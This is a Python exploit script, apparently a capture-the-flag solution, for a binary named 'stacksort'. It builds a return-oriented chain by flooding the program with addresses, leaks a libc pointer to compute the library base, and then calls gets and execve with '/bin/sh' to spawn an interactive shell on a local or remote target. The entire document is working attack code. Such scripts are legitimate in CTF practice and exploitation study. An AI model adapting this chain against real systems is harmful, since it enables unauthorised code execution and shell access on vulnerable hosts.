#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './stacksort'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'localhost', 'port':5000})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_ret            = 0x40101a
addr_plt_printf     = binf.plt['printf']
addr_start          = binf.sep_function['_start']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    align = 1

    # 1st
    '''
    for _ in range(0xe0+align):
        conn.sendafter(b': ', str(addr_ret).encode())
    conn.sendafter(b': ', str(addr_plt_printf).encode())
    for _ in range(0x100-(0xe0+align+1)):
        conn.sendafter(b': ', str(addr_main).encode())
    '''
    conn.send(str(addr_ret).encode().ljust(0xf)*(0xe0+align))
    conn.send(str(addr_plt_printf).encode().ljust(0xf))
    conn.send(str(addr_main).encode().ljust(0xf)*(0x100-(0xe0+align+1)))
    conn.recvuntil(b'255: ')

    addr_libc_mainarena = u(conn.recvuntil(b'0', drop=True)) - 0x4d0
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_ret       = libc.address + 0x02a179
    addr_libc_gets      = libc.sep_function['gets']     # 0x080520/0x0805a0
    addr_libc_call_r13  = libc.address + (0x0c609c if env.check('remote') else 0x0c611c)
    addr_libc_execve    = libc.sep_function['execve']   # 0x0eb080/0x0eb0f0

    # 2nd
    '''
    for _ in range(0xf1-align):
        conn.sendafter(b': ', str(addr_libc_ret).encode())
    conn.sendafter(b': ', str(addr_libc_gets).encode())
    conn.sendafter(b': ', str(addr_libc_call_r13).encode())
    for _ in range(0x100-(0xf1-align+2)):
        conn.sendafter(b': ', str(addr_libc_call_r13).encode())
    '''
    conn.send(str(addr_libc_ret).encode().ljust(0xf)*(0xf1-align))
    conn.send(str(addr_libc_gets).encode().ljust(0xf))
    conn.send(str(addr_libc_call_r13).encode().ljust(0xf))
    conn.send(b'-1'.ljust(0xf)*(0x100-(0xf1-align+2)))
    conn.recvuntil(b'255: ')

    conn.sendline(b'/bin/sh\x00')

    # 3rd
    '''
    for _ in range(0x100):
        conn.sendafter(b': ', str(addr_libc_execve).encode())
    '''
    conn.send(str(addr_libc_execve).encode().ljust(0xf)*0x100)
    conn.recvuntil(b'255: ')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
